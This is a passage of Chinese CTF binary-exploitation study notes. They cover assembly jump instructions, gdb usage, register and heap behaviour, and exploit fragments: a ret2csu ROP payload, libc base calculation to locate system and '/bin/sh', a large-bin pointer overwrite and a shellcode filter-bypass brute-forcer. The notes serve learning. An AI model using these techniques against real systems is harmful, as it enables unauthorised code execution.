punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    payload<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>csu1<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rbx<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rbp<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>r12<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>r13<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>r14<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>r15<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>csu2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    payload<span class=\"token operator\">+=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">56</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>csu<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>write_got<span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span>write_got<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>main_add<span class=\"token punctuation\">)</span> <span class=\"token comment\">#两个必须都是 got 表</span></pre></td></tr></table></figure><p>看到使用 csu 构造 rop，r12 执行的函数必须是在 got 表的地址</p>\n<h3 id=\"26exp输出我们接收的字符\"><a class=\"anchor\" href=\"#26exp输出我们接收的字符\">#</a> 26.exp 输出我们接收的字符</h3>\n<p>利用 <code>log.info(hex() )</code></p>\n<h3 id=\"27prctl-seccomp沙盒机制\"><a class=\"anchor\" href=\"#27prctl-seccomp沙盒机制\">#</a> 27.prctl-seccomp (沙盒机制)</h3>\n<p>利用命令 <code>seccomp-tools dump ./程序名</code> 查看哪些函数被禁用了</p>\n<p>而我们想要绕过需要利用 orw（open/read/write）组合方式读取 flag</p>\n<h3 id=\"28汇编指令jmpjejsjpjojb\"><a class=\"anchor\" href=\"#28汇编指令jmpjejsjpjojb\">#</a> 28. 汇编指令（JMP,JE,JS,JP,JO,JB）</h3>\n<ol>\n<li>\n<p>JMP 无条件跳转</p>\n</li>\n<li>\n<p>JE（JZ）条件跳转</p>\n<p>当 ZF 标致为 1 的时候发生跳转，为 0 的时候不跳转，可以双击标志位，进行判断</p>\n</li>\n<li>\n<p>JNE（JNZ）条件跳转</p>\n<p>当 ZF 标致为 0 的时候发生跳转，为 1 的时候不跳转，可以双击标志位，进行判断</p>\n</li>\n<li>\n<p>JS 条件跳转（JNS 相反操作）</p>\n<p>当为整数时，SF 标志位为 0，负数事 SF 标志位为 1，当 SF 为 1 时，JS 发生跳转</p>\n</li>\n<li>\n<p>JP 条件跳转（JNP 反向操作）</p>\n<p>当二进制 1 的个数为偶数时，PF 标志位为 1，当二进制 1 的个数为奇数时，PF 标志位为 0，当 PF 标志位为 1 时，JP 发生跳转</p>\n</li>\n<li>\n<p>JO 条件跳转（JNO 反向操作）</p>\n<p>当结果溢出了，OF 标志位为 1，JO 会发生跳转，当 OF 标志位为 0 时，JO 不发生跳转</p>\n</li>\n<li>\n<p>JB 条件跳转（JNB 反向操作）</p>\n<p>当结果需要借位或者进位的时候，CF 变为 1，当值 1 的时候，JB 发生跳转</p>\n</li>\n<li>\n<p>JBE 跳转</p>\n<p>当 CF 或者 ZF 标志位 1 的时候跳转</p>\n</li>\n<li>\n<p>JG 跳转</p>\n<p>比较结果为大于时跳转（等于也不行）</p>\n</li>\n<li>\n<p>JL 跳转</p>\n<p>比较结果如果小于 (&lt;) 则跳转</p>\n</li>\n<li>\n<p>JLE 跳转</p>\n<p>如果小于或等于 (&lt;=) 跳转</p>\n</li>\n</ol>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC82MTE1NTI2NzU=\">https://zhuanlan.zhihu.com/p/611552675</span></p>\n<p>通俗表示：</p>\n<pre><code>JE   ;等于则跳转\nJNE  ;不等于则跳转\n\nJZ   ;为 0 则跳转\nJNZ  ;不为 0 则跳转\n\nJS   ;为负则跳转\nJNS  ;不为负则跳转\n\nJC   ;进位则跳转\nJNC  ;不进位则跳转\n\nJO   ;溢出则跳转\nJNO  ;不溢出则跳转\n\nJA   ;无符号大于则跳转\nJNA  ;无符号不大于则跳转\nJAE  ;无符号大于等于则跳转\nJNAE ;无符号不大于等于则跳转\n\nJG   ;有符号大于则跳转\nJNG  ;有符号不大于则跳转\nJGE  ;有符号大于等于则跳转\nJNGE ;有符号不大于等于则跳转\n\nJB   ;无符号小于则跳转\nJNB  ;无符号不小于则跳转\nJBE  ;无符号小于等于则跳转\nJNBE ;无符号不小于等于则跳转\n\nJL   ;有符号小于则跳转\nJNL  ;有符号不小于则跳转\nJLE  ;有符号小于等于则跳转\nJNLE ;有符号不小于等于则跳转\n\nJP   ;奇偶位置位则跳转\nJNP  ;奇偶位清除则跳转\nJPE  ;奇偶位相等则跳转\nJPO  ;奇偶位不等则跳转\n</code></pre>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BvcHRhci9hcnRpY2xlL2RldGFpbHMvMTExNjg2MDUw\">https://blog.csdn.net/poptar/article/details/111686050</span></p>\n<h3 id=\"30gdb查看地址对应值情况\"><a class=\"anchor\" href=\"#30gdb查看地址对应值情况\">#</a> 30.gdb 查看地址对应值情况</h3>\n<p>命令 <code>telescope 地址 显示行数</code>   (x/30gx 地址 是详细显示)</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/03/pPO3li6.png\" alt=\"\" /></p>\n<h3 id=\"31gdb查看堆块情况\"><a class=\"anchor\" href=\"#31gdb查看堆块情况\">#</a> 31.gdb 查看堆块情况</h3>\n<p>命令 <code>parseheap</code></p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/03/pPO3tLd.png\" alt=\"\" /></p>\n<h3 id=\"32利用libc本地库查询计算地址\"><a class=\"anchor\" href=\"#32利用libc本地库查询计算地址\">#</a> 32. 利用 libc 本地库查询计算地址：</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn77'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn77'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>libc<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"/lib/x86_64-linux-gnu/libc.so.6\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#引入方式，本地调试的话是需要先查看用的自己系统的哪个 libc【用 ldd ./pwn 来查看】</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>fgetc_got<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"fgetc\"</span><span class=\"token punctuation\">]</span><span class=\"token comment\">#plt 和 got 仍然是程序自己的</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>puts_plt<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>libc_base<span class=\"token operator\">=</span>puts<span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>system<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>binsh<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">b\"/bin/sh\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#这里一定要转化为字节，不然会报错</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"system:\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"binsh:\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>泄露的地址（64 位）：<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/04/pPO4sa9.png\" alt=\"\" /></p>\n<p>程序调用的本地 libc 查看：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250107183801979.png\" alt=\"image-20250107183801979\" /></p>\n<h3 id=\"33malloc返回值的指针指向data域\"><a class=\"anchor\" href=\"#33malloc返回值的指针指向data域\">#</a> 33.malloc 返回值的指针指向 data 域</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> <span class=\"token operator\">*</span>p1<span class=\"token operator\">=</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x400</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 申请了一个大 chunk</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">free</span><span class=\"token punctuation\">(</span>p1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 释放后先进入 unsorted 然后根据情况进入 largebin 中【大于 512 (1024) 字节】（进入 smallbin 是  size  小于 0x3f0，大于 0x3f0 就进入 largebin）</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p1<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">0x3f1</span>  <span class=\"token comment\">// 修改 size 域（p1 指向 data 域）</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 修改 fd</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">0x7fffffff</span> df18<span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 修改 bk</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>p1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">// 修改 fd_nextsize</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">0x7fffffff</span> df10<span class=\"token punctuation\">;</span>    <span class=\"token comment\">// 修改 bk_nextsize</span></pre></td></tr></table></figure><p><img data-src=\"https://img-blog.csdnimg.cn/20210120152320897.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjAyMjM3,size_16,color_FFFFFF,t_70\" alt=\"\" /></p>\n<h3 id=\"34查看glibc版本\"><a class=\"anchor\" href=\"#34查看glibc版本\">#</a> 34. 查看 GLIBC 版本</h3>\n<p>通过给定的 libc 文件查看 <code>strings libc.so.6 | grep &quot;GLIBC&quot;</code></p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/10/pPxOzBd.png\" alt=\"\" /></p>\n<h3 id=\"35字节相加\"><a class=\"anchor\" href=\"#35字节相加\">#</a> 35. 字节相加：</h3>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E5%9B%BE%E5%BA%8A/7C0JC3%7E40B9%7E5P%24R%7D%29Z3S%5DA.png\" alt=\"\" /></p>\n<p>可发现将加入的字节放入数列后面</p>\n<h3 id=\"36puts与printf覆盖结尾空字符可以造成泄露\"><a class=\"anchor\" href=\"#36puts与printf覆盖结尾空字符可以造成泄露\">#</a> 36.puts 与 printf (覆盖结尾空字符可以造成泄露)</h3>\n<p>puts 函数是 C 语言标准库中的一个函数，用于输出一个字符串并在结尾加上一个 <code>换行符（'\\n'）</code> 。</p>\n<p>当 puts 函数 <code>遇到</code> 字符串结尾的 <code>空字符（'\\0'）</code> 时，它会 <code>停止输出</code> ，因为空字符是 C 语言中字符串的结束标志， <code>意味着可以覆盖原本的空字符来泄露后面的内容</code></p>\n<p>printf 函数：</p>\n<p>在 C 语言中，printf 默认会在输出的末尾 <code>自动添加换行符</code> 。如果想避免这个行为，可以使用  <code>%s</code>  格式说明符来输出 <code>字符串</code> ，并且在最后 <code>不添加</code> 换行符。例如：</p>\n<p><code>printf(&quot;%s&quot;, &quot;Hello World&quot;);</code></p>\n<p>这样就能在输出  <code>Hello World</code>  后不换行。</p>\n<p>使用 printf 函数输出一个 <code>字符数组</code> 时，它会从数组的开头开始扫描，直到遇到一个值为 <code>\\0</code>  的字符为止，然后停止输出</p>\n<p>也就是说 <code>printf(%s,a)</code>  会输出 <code>a</code>  字符串直到遇到 <code>空字符</code></p>\n<p>【sendline 送出去我们的 payload, 因为 sendline 的特性最后在末尾会补充上 \\00, 这样的话就进行 \\00 截断了，也就无法泄露值了】</p>\n<h3 id=\"37gdb调试源码调试时显示对于的源代码\"><a class=\"anchor\" href=\"#37gdb调试源码调试时显示对于的源代码\">#</a> 37.gdb 调试源码（调试时显示对于的源代码）</h3>\n<p>再根目录下用 <code>vim .gdbinit</code></p>\n<p>原来的：</p>\n<pre><code>source /home/pwn/pwn/pwndbg/gdbinit.py\nsource ~/pwn/Pwngdb/pwngdb.py\nsource ~/pwn/Pwngdb/angelheap/gdbinit.py\n\ndefine hook-run\npython\nimport angelheap\nangelheap.init_angelheap()\nend\nend\n</code></pre>\n<p>添加一个 <code>dir  调试函数的所在目录</code> （不包含函数本身）</p>\n<p>该目录利用 <code>pwd</code>  命令查看 (以 <code>malloc.c</code>  为例)</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E5%9B%BE%E5%BA%8A/%253%5BZ2W%5D1P37%28ZM%7B_V4J0B%29V.png\" alt=\"\" /></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E5%9B%BE%E5%BA%8A/V3Z9SVW3X9%5DM%40KNQMQ8RBAD.png\" alt=\"\" /></p>\n<p>然后 gdb 继续调试 elf 程序即可，等进入你装载进去的文件之后，就会自动展示 glibc 源代码，调试对应的版本的 elf 文件的程序会显示源码</p>\n<h3 id=\"38lea指令\"><a class=\"anchor\" href=\"#38lea指令\">#</a> 38.lea 指令</h3>\n<p><code>lea:</code></p>\n<p><code>load effective address</code> , 加载有效地址，可以将有效 <code>地址传送到指定的的寄存器</code> 。指令形式是从存储器读数据到寄存器，效果是将存储器的有效地址写入到目的操作数，简单说，就是 C 语言中的”&amp;”</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9heWVzYXd5ZXIuZ2l0aHViLmlvLzIwMTkvMDIvMTQvJUU2JUIxJTg3JUU3JUJDJTk2JUU2JThDJTg3JUU0JUJCJUE0JUU3JTlBJTg0JUU3JUE3JUFGJUU3JUI0JUFGLw==\">https://ayesawyer.github.io/2019/02/14 / 汇编指令的积累 /</span></p>\n<h3 id=\"39cdqe指令\"><a class=\"anchor\" href=\"#39cdqe指令\">#</a> 39.cdqe 指令</h3>\n<p>符号拓展指令 CBW、CWD、CDQ、CWDE、CDQE</p>\n<pre><code>符号拓展指令，使用符号位拓展数据类型。\n\ncbw 使用al的最高位拓展ah的所有位\n\ncwd使用ax的最高位拓展dx的所有位\n\ncdq使用eax的最高位拓展edx的所有位\n\ncwde使用ax的最高位拓展eax高16位的所有位\n\ncdqe使用eax的最高位拓展rax高32位的所有位\n</code></pre>\n<p>下面的例子说明了拓展的用法，是用最高位（转为二进制的最高位）来填充高位（0x7F= <code>0111 1111</code> , 所以拓展的高位都是 0；0x80= <code>1000 0000</code> ，所以拓展的高位都是 1（十六进制就成为了 FFFF））</p>\n<pre><code class=\"language-asm\">\n    mov al, 7Fh\n    cbw\n    PrintHex ax ;007F\n    \n    mov al, 80h\n    cbw\n    PrintHex ax ;FF80\n    \n    ;CWDE\n    mov ax, 7FFFh\n    cwde\n    PrintHex eax ;00007FFF\n    \n    mov ax, 8000h\n    cwde\n    PrintHex eax ;FFFF8000\n\n</code></pre>\n<h3 id=\"40movzx指令与cdqe类似但是不考虑符号位拓展\"><a class=\"anchor\" href=\"#40movzx指令与cdqe类似但是不考虑符号位拓展\">#</a> 40.movzx 指令（与 cdqe 类似但是不考虑符号位拓展）</h3>\n<p>movzx 是将源操作数的内容拷贝到目的操作数，并将该值用 0 扩展至 16 位或者 32 位。但是它只适用于无符号整数。 他大致下面的三种格式</p>\n<pre><code>movzx 32位通用寄存器, 8位通用寄存器/内存单元\nmovzx 32位通用寄存器, 16位通用寄存器/内存单元\nmovzx 16位通用寄存器, 8位通用寄存器/内存单元\n</code></pre>\n<p>汇编语言数据传送指令 MOV 的变体。无符号扩展，并传送</p>\n<p>例子：</p>\n<pre><code class=\"language-asm\">\nmov eax, 0x00304000h\nmovzx eax, ax\nPrintHex eax; 0x00004000h\n\nmov eax, 0x00304000h\nmovzx eax, ah\nPrintHex eax; 0x00000040h\n\nmov BL,80H\nmovzx AX,BL\nPrintHex AX;0X0080H\n//由于BL为80H，最高位也即符号位为1，但在进行无符号扩展时，其扩展的高8位均为0，故赋值AX为0080H\n\n</code></pre>\n<p>00304000h 存放在内存为 (//00 40 30 00  小端序) ，在寄存器中是正常顺序</p>\n<h3 id=\"41要执行的shellcode第一个命令不能为0-pwn66\"><a class=\"anchor\" href=\"#41要执行的shellcode第一个命令不能为0-pwn66\">#</a> 41. 要执行的 shellcode 第一个命令不能为 0 【pwn66】</h3>\n<p>在一些过滤条件里 shellcode 需要第一个字节为 <code>\\x00</code>  才能绕过检测，这种情况下，需要让第一个 <code>字节</code> 为 0，第二个字节为 <code>有效</code> 的字节（为了和第一个字节组成 <code>有效</code> 汇编指令）, 一般情况下， <code>\\x00B</code>  后加一个字符，对应一个汇编语句（所以我们可以通过 \\x00B\\x22、\\x00B\\x00 、\\x00J\\x00 等等来绕过第一个字节为 <code>\\x00</code>  的检测）</p>\n<p>还可以查找第一个字节为 <code>0x00</code>  的汇编指令</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> itertools <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> re</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token comment\">#这里先一个 for 循环，里面嵌套了一个迭代，里面是组合一个字节或者两个字节长度（i 决定），赋值给 j</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> product<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>p8<span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> k <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>repeat<span class=\"token operator\">=</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        payload<span class=\"token operator\">=</span><span class=\"token string\">b'\\x00'</span><span class=\"token operator\">+</span><span class=\"token string\">b\"\"</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span><span class=\"token comment\">#Python join () 方法用于将序列中的元素以指定的字符连接生成一个新的字符串。</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        p<span class=\"token operator\">=</span>disasm<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token comment\">#pwntools 将机器码转为汇编（asm 是汇编转机器码）</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            p <span class=\"token operator\">!=</span><span class=\"token string\">\"    ...\"</span> </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token keyword\">and</span> <span class=\"token keyword\">not</span> re<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">r\"\\[\\w*?\\]\"</span><span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span> <span class=\"token comment\">#正则过滤，过滤</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">and</span> <span class=\"token string\">\".byte\"</span> <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token comment\">#input()</span></pre></td></tr></table></figure><p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E5%9B%BE%E5%BA%8A/2%2486%60%40TG%7E9H6%25A8KY52GPXM.png\" alt=\"\" /></p>\n<p>过滤掉包含形如 [\\w*?] 的内容可能是为了避免使用包含内存地址或变量名的指令序列。</p>\n<p>正则表达式模式 r&quot;[\\w*?]&quot; 匹配形如 [...] 的内容，其中 [] 表示方括号，\\w 表示匹配任意字母、数字或下划线的字符，*? 表示非贪婪匹配，即尽可能少地匹配字符</p>\n<h4 id=\"itertools-为高效循环而创建迭代器的函数\"><a class=\"anchor\" href=\"#itertools-为高效循环而创建迭代器的函数\">#</a> itertools --- 为高效循环而创建迭代器的函数</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvemgtY24vMy9saWJyYXJ5L2l0ZXJ0b29scy5odG1s\">https://docs.python.org/zh-cn/3/library/itertools.html</span></p>\n<p>repeat () //elem [,n] //elem, elem, elem, ... 重复无限次或 n 次</p>\n<p>如：</p>\n<p>repeat(10, 3) --&gt; 10 10 10</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E5%9B%BE%E5%BA%8A/67B5%7D%40K%28%25%29H4KUTSCKQ3%28XP.png\" alt=\"\" /></p>\n<p>re.search () 是 Python 中 re 模块提供的函数之一，用于在字符串中搜索匹配指定模式的子串。</p>\n<h3 id=\"researchpattern-string接受两个参数\"><a class=\"anchor\" href=\"#researchpattern-string接受两个参数\">#</a> re.search (pattern, string) 接受两个参数：</h3>\n<p>pattern：要匹配的正则表达式模式。<br />\nstring：要在其中搜索匹配的字符串。<br />\n函数返回一个匹配对象（Match object），如果找到匹配的子串，则可以使用匹配对象的方法和属性来获取有关匹配的信息。</p>\n<p>在给定的代码中，re.search () 用于检查反汇编结果字符串是否匹配特定的模式。具体而言，它使用正则表达式模式来搜索字符串 res 中是否存在满足以下条件的子串：</p>\n<p>子串不包含 &quot;[...]&quot; 形式的内容，即不包含方括号中的任何单词。<br />\n子串不包含 &quot;.byte&quot;。</p>\n<h3 id=\"42__isoc99_scanfp-v5作用\"><a class=\"anchor\" href=\"#42__isoc99_scanfp-v5作用\">#</a> 42. <code>__isoc99_scanf(&quot;%p&quot;, &amp;v5);</code>  作用</h3>\n<p>这里是让我们输入一个 <code>地址</code> 进去，后面的 <code>v5();</code>  是在执行该地址的命令</p>\n<h3 id=\"43-汇编-nop指令ctfshow-67\"><a class=\"anchor\" href=\"#43-汇编-nop指令ctfshow-67\">#</a> 43. 汇编 nop 指令 (ctfshow 67)</h3>\n<p>空操作指令指令格式：NOP</p>\n<p>x86 CPU 上的 NOP 指令实质上是 XCHG EAX, EAX（操作码为 0x90)</p>\n<pre><code>说明：NOP是英语“No Operation”的缩写。NOP无操作数，所以称为“空操作”。\n\n执行NOP指令只使程序计数器PC加1【让eip+1】，所以占用一个机器周期。实例：MOVLW 0xOF ；送OFH到W MOVWF PORT_B ；W内容写入B口 NOP ；空操作 MOVF PORT_B，W ；\n</code></pre>\n<h3 id=\"44遇到这种输入地址__isoc99_scanfp-v5\"><a class=\"anchor\" href=\"#44遇到这种输入地址__isoc99_scanfp-v5\">#</a> 44. 遇到这种输入地址 <code>__isoc99_scanf(&quot;%p&quot;, &amp;v5);</code></h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">__isoc99_scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%p\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token function\">v5</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这种输入地址直接发送： <code>hex（addr）</code>  ，不再进行 p32/p64 转化</p>\n<p>但是是 % s 时仍然需要转化</p>\n<h3 id=\"45函数需要返回地址和不需要返回地址的区分\"><a class=\"anchor\" href=\"#45函数需要返回地址和不需要返回地址的区分\">#</a> 45. 函数需要返回地址和不需要返回地址的区分</h3>\n<p>我们在用 ret 覆盖时，如果是用 plt 表的地址覆盖，就需要返回地址，因此在限制了字节数时，不能调用 plt 因为 plt 需要返回值，但如果程序中有现成的 call 函数（如 system（echo 'ok'）有 call system，需要参数）就可以不用返回值了，因为它会自己把下一条指令给压进去（这里直接用 call system 的地址即可）</p>\n<h3 id=\"46关于malloc\"><a class=\"anchor\" href=\"#46关于malloc\">#</a> 46. 关于 malloc</h3>\n<p>调用 malloc (64) 后缓冲池大小从 0 变成了 0x20ff8，将 malloc (64) 改成 malloc (1) 结果也是一样，只要 malloc 分配的内存数量不超过 0x20ff8，缓冲池都是默认扩充 0x20ff8 大小</p>\n<p>值得注意的是如果 malloc 一次分配的内存超过了 0x20ff8，malloc 不再从堆中分配空间，而是使用 mmap () 这个系统调用从映射区寻找可用的内存空间</p>\n<h3 id=\"47关于ebp和esp内存放的值\"><a class=\"anchor\" href=\"#47关于ebp和esp内存放的值\">#</a> 47 关于 ebp 和 esp 内存放的值：</h3>\n<p>（1）ESP：栈指针寄存器 (extended stack pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个 <code>栈帧的栈顶</code> 。</p>\n<p>（2）EBP：基址指针寄存器 (extended base pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个 